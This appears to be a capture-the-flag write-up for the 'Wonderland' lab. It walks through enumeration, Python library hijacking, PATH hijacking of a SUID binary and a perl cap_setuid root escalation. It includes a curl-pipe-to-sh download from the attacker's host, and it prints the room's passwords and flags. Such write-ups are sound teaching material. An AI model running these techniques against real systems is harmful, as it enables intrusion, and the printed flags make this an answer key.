# Wonderland
Fall down the rabbit hole and enter wonderland.

## Port Enumeration
First we started by scanning ports on the target machine using the following command:

```
nmap --top-ports 1000 -sV -sC -oN nmap-results-scripts.txt <IP>
```

Reviewing the results from Nmap we find 2 ports open, ssh and http. 

```
┌──(kali㉿kali)-[~/Documents/wonderland]
└─$ nmap --top-ports 1000 -sV -sC -oN nmap-results-scripts.txt 10.10.230.5  
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-18 05:45 EDT
Nmap scan report for 10.10.230.5
Host is up (0.29s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.56 seconds
```
We observe two are two services open, ssh and http. Lets move onto exploring the website hosted on port 80.

## Web Enumeration

Prior to navigating to the webserver via a browser, we start a web enumeration using ffuf. 

```
ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://<IP>/FUZZ -e .php,.js,.asp
```
Reviewing the results we observe its running javascript, but not much else of interest from the web fuzzer. 

```
┌──(kali㉿kali)-[~/Documents/wonderland]
└─$ ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.10.230.5/FUZZ -e .php,.js,.asp

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.230.5/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Extensions       : .php .js .asp 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

img                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 287ms]
poem                    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 297ms]
r                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 293ms]
:: Progress: [81876/81876] :: Job [1/1] :: 140 req/sec :: Duration: [0:10:08] :: Errors: 0 :
```

## Website

Navigating to the website, we get presented with instruction to `Follow the White Rabbit`. 

Viewing the page source of the main page reveals no additional information. 

We observe there are three image files at `http://<IP>/img/`. 

Lets try and inspect the images using `steghide` to see if there is any hidden data. 

Downloading the jpgs (as steghide doesn't support png file types), we then inspect them for information using a blank password. 

Inspecting `alide_door.jpg`

```
┌──(kali㉿kali)-[~/Documents/wonderland]
└─$ steghide info alice_door.jpg
"alice_door.jpg":
  format: jpeg
  capacity: 68.9 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
steghide: could not extract any data with that passphrase!
```
Nothing reported by steghide. 

Inspecting `white_rabbit_1.jpg` 

```
┌──(kali㉿kali)-[~/Documents/wonderland]
└─$ steghide info white_rabbit_1.jpg
"white_rabbit_1.jpg":
  format: jpeg
  capacity: 99.2 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "hint.txt":
    size: 22.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
```

Interesting! there is an embedded `hint.txt`.

Lets extract the data

```
┌──(kali㉿kali)-[~/Documents/wonderland]
└─$ steghide extract -sf white_rabbit_1.jpg
Enter passphrase: 
wrote extracted data to "hint.txt".
```

Looking at the `hint.txt`

```
┌──(kali㉿kali)-[~/Documents/wonderland]
└─$ cat hint.txt 
follow the r a b b i t 
```
Interesting. The fuzzing the website we got a hit for `http://<IP>/r/`. 

Lets first have a look at `http://<IP>/poem/`. Nothing too interesting there. Just the Jabberwocky poem from alice in wonderland. Nothing revealed inspecting the source for the page either. 

Moving onto `http://<IP>/r/` we are presented with the following text. 

```
Keep Going.
"Would you tell me, please, which way I ought to go from here?"
```

Interesting, lets try to  "Follow the r a b b i t" and navigate to `http://<IP>/r/a/`

```
Keep Going.
"That depends a good deal on where you want to get to," said the Cat.
```
It should be noted that fuzzing the website using ffuf command above doesn't recursively search pages. It can ran in recursive mode, which significantly extend the fuzz time as it branches off every hit and re-executes a search using the wordlist. 

Lets jump forward and see where following the `r a b b i t` takes us. Navigating to `http://<IP>/r/a/b/b/i/t/`

Nothing too interesting on the page, lets inspect the source for the page. 

```
<!DOCTYPE html>

<head>
    <title>Enter wonderland</title>
    <link rel="stylesheet" type="text/css" href="/main.css">
</head>

<body>
    <h1>Open the door and enter wonderland</h1>
    <p>"Oh, you’re sure to do that," said the Cat, "if you only walk long enough."</p>
    <p>Alice felt that this could not be denied, so she tried another question. "What sort of people live about here?"
    </p>
    <p>"In that direction,"" the Cat said, waving its right paw round, "lives a Hatter: and in that direction," waving
        the other paw, "lives a March Hare. Visit either you like: they’re both mad."</p>
    <p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>
    <img src="/img/alice_door.png" style="height: 50rem;">
</body>
```

There is a paragraph tab with `"display: none;` that looks like a username and password to me. Lets try authenticating to `ssh` using `alice` as the username and `HowDothTheLittleCrocodileImproveHisShiningTail` as the password

```
┌──(kali㉿kali)-[~/Documents/wonderland]
└─$ ssh alice@10.10.230.5                                       
The authenticity of host '10.10.230.5 (10.10.230.5)' can't be established.
ED25519 key fingerprint is SHA256:Q8PPqQyrfXMAZkq45693yD4CmWAYp5GOINbxYqTRedo.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.230.5' (ED25519) to the list of known hosts.
alice@10.10.230.5's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Oct 18 10:15:26 UTC 2022

  System load:  0.0                Processes:           85
  Usage of /:   18.9% of 19.56GB   Users logged in:     0
  Memory usage: 15%                IP address for eth0: 10.10.230.5
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.


Last login: Mon May 25 16:37:21 2020 from 192.168.170.1
alice@wonderland:~$ 
```

Success!

## User Flag

Lets try and find the user flag. 

```
alice@wonderland:~$ ls
root.txt  walrus_and_the_carpenter.py
```
Weirdly, `root.txt` appears to be in the user directory. Typically we'd expect `user.txt` in the location providing the user flag. 

We also observe a python script `walrus_and_the_carpenter.py`

Lets review our permissions in this directory. 

```
alice@wonderland:~$ ll
total 44
drwxr-xr-x 5 alice alice 4096 Oct 18 10:17 ./
drwxr-xr-x 6 root  root  4096 May 25  2020 ../
lrwxrwxrwx 1 root  root     9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 alice alice  220 May 25  2020 .bash_logout
-rw-r--r-- 1 alice alice 3771 May 25  2020 .bashrc
drwx------ 2 alice alice 4096 May 25  2020 .cache/
drwx------ 3 alice alice 4096 May 25  2020 .gnupg/
drwxrwxr-x 3 alice alice 4096 May 25  2020 .local/
-rw-r--r-- 1 alice alice  807 May 25  2020 .profile
-rw------- 1 alice alice  901 Oct 18 10:17 .viminfo
-rw------- 1 root  root    66 May 25  2020 root.txt
-rw-r--r-- 1 root  root  3577 May 25  2020 walrus_and_the_carpenter.py
```

Unfortunately we don't have credentials to read `root.txt`. We also don't have credentials to write `walrus_and_the_carpenter.py` but we can read it. 

Lets give up on the user flag for now and try to escalate our privileges. 



## Privilege escalation enumeration
Now onto the root flag. We now have to find a way to escalate our privileges to root. 

We begin by enumerating the linux machine using `linpeas`

First we need to get the `linpeas.sh` enumeration script onto the target. Identical to our approach for installing the ssh public key, we will download the `linpeas.sh` script locally and use a python http server to upload it to the target. 

Linpeas can be downloaded from [here](https://github.com/carlospolop/PEASS-ng) if you don't already have it available. 

Now navigate to where the `linpeas.sh` script resides and run a python http server. 

```
python3 -m http.server --bind 10.4.1.35 8000
```

Now on the target machine, use curl to download and pipe to sh the script. 

```
curl http://10.4.1.35:8000/linpeas.sh | sh
```

Wait for the linpeas.sh enumeration script to complete and then review its output. 

Reviewing the output of linpeas, we observe the following interesting privesc vectors. 

```
╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034    


╔══════════╣ Users with console
alice:x:1001:1001:Alice Liddell,,,:/home/alice:/bin/bash                                           
hatter:x:1003:1003:Mad Hatter,,,:/home/hatter:/bin/bash
rabbit:x:1002:1002:White Rabbit,,,:/home/rabbit:/bin/bash
root:x:0:0:root:/root:/bin/bash
tryhackme:x:1000:1000:tryhackme:/home/tryhackme:/bin/bash



╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities                                                                                      
Current capabilities:                                                                                                                                                
Current: =
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

Shell capabilities:
0x0000000000000000=
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

Files with capabilities (limited to 50):
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep

```

We know we can reliably get root using the CVE-2021-4034 exploit via `metasploit`, but we know this is not the intended privesc path for the CTF. 

We note there are a few users on the system, `alice` whom we already have teh credentials for, `rabbit`, `hatter` and `root`. Lets see if we can privesc to `root` or at least move laterally through the system into `rabbit` or `hatter`.

Lets now inspect the files with capabilities. 

```
alice@wonderland:~$ cd /usr/bin/
alice@wonderland:/usr/bin$ ll | grep perl
-rwxr-xr--  2 root   hatter   2097720 Nov 19  2018 perl*
-rwxr-xr-x  1 root   root       10216 Nov 19  2018 perl5.26-x86_64-linux-gnu*
-rwxr-xr--  2 root   hatter   2097720 Nov 19  2018 perl5.26.1*
-rwxr-xr-x  2 root   root       45853 Nov 19  2018 perlbug*
-rwxr-xr-x  1 root   root         125 Nov 19  2018 perldoc*
-rwxr-xr-x  1 root   root       10864 Nov 19  2018 perlivp*
-rwxr-xr-x  2 root   root       45853 Nov 19  2018 perlthanks*
```

Weird. `perl` which has the `cap_setuid+ep` capability, which we can absolutely exploit to obtain root, is only executable by the `root` user and the `hatter` group. We'll have to find a way to move laterally into the `hatter` user account. 

Now lets inspect alice's sudo permissions, given we have her password. 

```
alice@wonderland:~$ sudo -l
[sudo] password for alice: 
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

Interestingly we can execute the `walrus_and_the_carpenter.py` script as the `rabbit` user using sudo. 


## Python library hijacking

Lets inspect the `walrus_and_the_carpenter.py` 

```python
import random
poem = """The sun was shining on the sea,
Shining with all his might:
He did his very best to make
The billows smooth and bright —
And this was odd, because it was
The middle of the night.

The moon was shining sulkily,
Because she thought the sun
Had got no business to be there
After the day was done —
"It’s very rude of him," she said,
"To come and spoil the fun!"

The sea was wet as wet could be,
The sands were dry as dry.
You could not see a cloud, because
No cloud was in the sky:
No birds were flying over head —
There were no birds to fly.

The Walrus and the Carpenter
Were walking close at hand;
They wept like anything to see
Such quantities of sand:
"If this were only cleared away,"
They said, "it would be grand!"

"If seven maids with seven mops
Swept it for half a year,
Do you suppose," the Walrus said,
"That they could get it clear?"
"I doubt it," said the Carpenter,
And shed a bitter tear.

"O Oysters, come and walk with us!"
The Walrus did beseech.
"A pleasant walk, a pleasant talk,
Along the briny beach:
We cannot do with more than four,
To give a hand to each."

The eldest Oyster looked at him.
But never a word he said:
The eldest Oyster winked his eye,
And shook his heavy head —
Meaning to say he did not choose
To leave the oyster-bed.

But four young oysters hurried up,
All eager for the treat:
Their coats were brushed, their faces washed,
Their shoes were clean and neat —
And this was odd, because, you know,
They hadn’t any feet.

Four other Oysters followed them,
And yet another four;
And thick and fast they came at last,
And more, and more, and more —
All hopping through the frothy waves,
And scrambling to the shore.

The Walrus and the Carpenter
Walked on a mile or so,
And then they rested on a rock
Conveniently low:
And all the little Oysters stood
And waited in a row.

"The time has come," the Walrus said,
"To talk of many things:
Of shoes — and ships — and sealing-wax —
Of cabbages — and kings —
And why the sea is boiling hot —
And whether pigs have wings."

"But wait a bit," the Oysters cried,
"Before we have our chat;
For some of us are out of breath,
And all of us are fat!"
"No hurry!" said the Carpenter.
They thanked him much for that.

"A loaf of bread," the Walrus said,
"Is what we chiefly need:
Pepper and vinegar besides
Are very good indeed —
Now if you’re ready Oysters dear,
We can begin to feed."

"But not on us!" the Oysters cried,
Turning a little blue,
"After such kindness, that would be
A dismal thing to do!"
"The night is fine," the Walrus said
"Do you admire the view?

"It was so kind of you to come!
And you are very nice!"
The Carpenter said nothing but
"Cut us another slice:
I wish you were not quite so deaf —
I’ve had to ask you twice!"

"It seems a shame," the Walrus said,
"To play them such a trick,
After we’ve brought them out so far,
And made them trot so quick!"
The Carpenter said nothing but
"The butter’s spread too thick!"

"I weep for you," the Walrus said.
"I deeply sympathize."
With sobs and tears he sorted out
Those of the largest size.
Holding his pocket handkerchief
Before his streaming eyes.

"O Oysters," said the Carpenter.
"You’ve had a pleasant run!
Shall we be trotting home again?"
But answer came there none —
And that was scarcely odd, because
They’d eaten every one."""

for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)
```

We can't write to the file due to not having sufficient permissions. We do observer that it imports the `random` python library. 

We can utilise a technique called python library hijacking to hijack the `random` library and replace it with out own code. Utilising this technique we can inject code to spawn a shell and get access to the `rabbit` user. 

Lets write a new python file `random.py`, co-located with the `walrus_and_the_carpenter.py` file to hijack the `random` library via the `import random` statement. Using [GTFOBins](https://gtfobins.github.io/) we grab a snippet for spawning a shell using python and write our hijack code

```python
import os; os.system("/bin/bash")
```

Now we use alice's sudo privileges to run `walrus_and_the_carpenter.py` using the `rabbit` account

```
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py 
rabbit@wonderland:~$ 
```

Success! We've managed to move laterally into the `rabbit` user account.

## PATH hijacking

Lets now see whats in rabbit's home directory

```
rabbit@wonderland:~$ cd /home/rabbit/
rabbit@wonderland:/home/rabbit$ ll
total 40
drwxr-x--- 2 rabbit rabbit  4096 May 25  2020 ./
drwxr-xr-x 6 root   root    4096 May 25  2020 ../
lrwxrwxrwx 1 root   root       9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 rabbit rabbit   220 May 25  2020 .bash_logout
-rw-r--r-- 1 rabbit rabbit  3771 May 25  2020 .bashrc
-rw-r--r-- 1 rabbit rabbit   807 May 25  2020 .profile
-rwsr-sr-x 1 root   root   16816 May 25  2020 teaParty*
```

There is a binary `teaParty`.

Some interesting things to note about the permissions for this file. It's owned by `root` and it has two `special` flags set. One for user, the `SUID` flag, and one for group, the `SGID` flag. The `SUID` flag set for a file always executes as the user who owns the file, regardless of the user passing the command. The `SGID` flag allows the file to be executed as the group that owns the file (similar to SUID). This means when we run the binary, it runs a `root`. This is a very good candidate for privesc to `root`

Lets try and run it.

```
rabbit@wonderland:/home/rabbit$ ./teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Tue, 18 Oct 2022 11:47:08 +0000
Ask very nicely, and I will give you some tea while you wait for him

Segmentation fault (core dumped)
```
Interesting, it reports a segmentation fault, which is usually indicative that the binary could be exploited for code injection. 

Lets try and find more information about the binary. Lets first download the file locally so we can inspect it on our kali machine.

Lets start a python webserver to host the file to our local machine.

```
rabbit@wonderland:/home/rabbit$ python3 -m http.server --bind 10.10.230.5 8000
Serving HTTP on 10.10.230.5 port 8000 (http://10.10.230.5:8000/) ...
```

Lets download the file using curl from our local machine

```
┌──(kali㉿kali)-[~/Documents/wonderland]
└─$ curl http://10.10.230.5:8000/teaParty --output teaParty
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 16816  100 16816    0     0  19129      0 --:--:-- --:--:-- --:--:-- 19130
```

Now working locally on our machine, lets inspect the binary further. 

First lets get some info on the binary using `file`

```
┌──(kali㉿kali)-[~/Documents/wonderland]
└─$ file teaParty     
teaParty: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=75a832557e341d3f65157c22fafd6d6ed7413474, not stripped
```

We observe its a 64 bit ELF executable. It's also not stripped, so it contains debug information, this should help us better understand the binary when we decompile it. 

Now lets dump the strings contained within the binary. 

```
┌──(kali㉿kali)-[~/Documents/wonderland]
└─$ strings teaParty                    
/lib64/ld-linux-x86-64.so.2
2U~4
libc.so.6
setuid
puts
getchar
system
__cxa_finalize
setgid
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
[]A\A]A^A_
Welcome to the tea party!
The Mad Hatter will be here soon.
/bin/echo -n 'Probably by ' && date --date='next hour' -R
Ask very nicely, and I will give you some tea while you wait for him
Segmentation fault (core dumped)
;*3$"
GCC: (Debian 8.3.0-6) 8.3.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.7325
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
teaParty.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
puts@@GLIBC_2.2.5
_edata
system@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
getchar@@GLIBC_2.2.5
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
setgid@@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
setuid@@GLIBC_2.2.5
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment
```

Weirdly, we observe a "Segmentation fault (core dumped)" string contained in the binary. Suspect the segmentation fault, isn't a true segmentation fault. 

We also observe the string "/bin/echo -n 'Probably by ' && date --date='next hour' -R". This is interesting as we can observe a call to the `date` command and because the path isn't absolute it's utilsing `PATH` to locate the file. We can hijack this path call and shove our own arbitary implementation of the `date` command on `PATH` to hijack code execution. 

First lets crack the binary open using [dogbolt](https://dogbolt.org/). Lets upload the binary and let `dogbolt` decompile the binary for us. 

I like using Ghidra or Binary Ninja. It typically produces the most readable decompiled code for me. Navigating to the main function call we observe the following

```c
void main(void)

{
  setuid(0x3eb);
  setgid(0x3eb);
  puts("Welcome to the tea party!\nThe Mad Hatter will be here soon.");
  system("/bin/echo -n \'Probably by \' && date --date=\'next hour\' -R");
  puts("Ask very nicely, and I will give you some tea while you wait for him");
  getchar();
  puts("Segmentation fault (core dumped)");
  return;
}
```

Our suspicion is confirmed regarding the `date` command. 

We also observe the binary sets both the uid and guid to `0x3eb`, not `root`. From the information exposed using `linpeas.sh` above and converting from hex to decimal we get user id `1003`. So exploiting this binary will set us our user and group permissions for the `hatter` account. 

To exploit the `date` command, we need to create our own `date` with code to spawn a shell, and we need to prefix this location onto `PATH`

Lets start by prefixing `/home/rabbit` to `PATH`

```
rabbit@wonderland:/home/rabbit$ export PATH=/home/rabbit/:$PATH
rabbit@wonderland:/home/rabbit$ echo $PATH
/home/rabbit/:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
```
Done. Now lets create a python script called `date` at `/home/rabbit` so we hijack code execution when running the `teaParty` binary. As above, lets use the python spawn shell code. 

It is important we also set the file as executable using `chmod`

```
rabbit@wonderland:/home/rabbit$ cat > date << EOF
python3 -c 'import os; os.system("/bin/bash")'
EOF

rabbit@wonderland:/home/rabbit$ chmod +x date 

rabbit@wonderland:/home/rabbit$ ./teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by hatter@wonderland:/home/rabbit$ 
```

Success! We're now the `hatter` user.

## perl cap_setuid+ep

As we recall from earlier, the `hatter` account had the ability to execute the `perl` which had the `cap_setuid+ep` capability. So lets exploit it to obtain root. 

Using [GTFOBins](https://gtfobins.github.io/gtfobins/perl/#capabilities) we can get a snippet for how to exploit `perl` with `cap_setuid+ep`.

```
hatter@wonderland:~$ perl
bash: /usr/bin/perl: Permission denied
```

Weird. We have the `hatter` account. Inspecting the user id details we can see the issue. 

```
hatter@wonderland:/usr/bin$ id
uid=1003(hatter) gid=1002(rabbit) groups=1002(rabbit)
```

Our uid is set to the `hatter`, but out group id is still set as `rabbit`. This is preventing us from using `perl` as we recall from earlier only the `root` user and `hatter` group have execute priviliedges. This is unexpected given the `setgid(0x3eb)` and `setuid(0x3eb)` function calls in the `teaParty` binary. Thankfully the `hatter` has left us their password in plaintext in their home directory. 

```
hatter@wonderland:/home/rabbit$ cd /home/hatter/

hatter@wonderland:/home/hatter$ ll
total 28
drwxr-x--- 3 hatter hatter 4096 May 25  2020 ./
drwxr-xr-x 6 root   root   4096 May 25  2020 ../
lrwxrwxrwx 1 root   root      9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 hatter hatter  220 May 25  2020 .bash_logout
-rw-r--r-- 1 hatter hatter 3771 May 25  2020 .bashrc
drwxrwxr-x 3 hatter hatter 4096 May 25  2020 .local/
-rw-r--r-- 1 hatter hatter  807 May 25  2020 .profile
-rw------- 1 hatter hatter   29 May 25  2020 password.txt

hatter@wonderland:/home/hatter$ cat password.txt 
WhyIsARavenLikeAWritingDesk?
```

Lets connect via `ssh` using the `hatter` credentials.

```
┌──(kali㉿kali)-[~/Documents/wonderland]
└─$ ssh hatter@10.10.232.163                                                                                                                                     1 ⨯
hatter@10.10.232.163's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Oct 18 12:08:31 UTC 2022

  System load:  0.0                Processes:           85
  Usage of /:   18.9% of 19.56GB   Users logged in:     0
  Memory usage: 13%                IP address for eth0: 10.10.232.163
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

hatter@wonderland:~$ 
```
Lets look at our ids.

```
hatter@wonderland:~$ id
uid=1003(hatter) gid=1003(hatter) groups=1003(hatter)
```

Much better. Now, lets try again to exploit `perl` with `cap_setuid+ep`.

```
hatter@wonderland:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
root@wonderland:~#
```

Success!

## Root flag

With root, lets navigate to the root home directory and see what's contained within. 

```
root@wonderland:~# cd /root
root@wonderland:/root# ll
total 28
drwx--x--x  4 root root 4096 May 25  2020 ./
drwxr-xr-x 23 root root 4096 May 25  2020 ../
lrwxrwxrwx  1 root root    9 May 25  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwxr-xr-x  3 root root 4096 May 25  2020 .local/
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 May 25  2020 .ssh/
-rw-r--r--  1 root root   32 May 25  2020 user.txt
```

Ok. So we've found the user flag. Lets grab its contents.

```
root@wonderland:/root# cat user.txt 
thm{"Curiouser and curiouser!"}
```
Recalling that the root flag was actually located in alice's home directory. Lets navigate there and use `root` to grab its content

```
root@wonderland:/root# cd /home/alice/

root@wonderland:/home/alice# ll
total 44
drwxr-xr-x 5 alice alice 4096 Oct 18 11:58 ./
drwxr-xr-x 6 root  root  4096 May 25  2020 ../
lrwxrwxrwx 1 root  root     9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 alice alice  220 May 25  2020 .bash_logout
-rw-r--r-- 1 alice alice 3771 May 25  2020 .bashrc
drwx------ 2 alice alice 4096 May 25  2020 .cache/
drwx------ 3 alice alice 4096 May 25  2020 .gnupg/
drwxrwxr-x 3 alice alice 4096 May 25  2020 .local/
-rw-r--r-- 1 alice alice  807 May 25  2020 .profile
-rw-rw-r-- 1 alice alice   34 Oct 18 11:58 random.py
-rw------- 1 root  root    66 May 25  2020 root.txt
-rw-r--r-- 1 root  root  3577 May 25  2020 walrus_and_the_carpenter.py

root@wonderland:/home/alice# cat root.txt 
thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}

```

We're done! We have both the user flag and the root flag.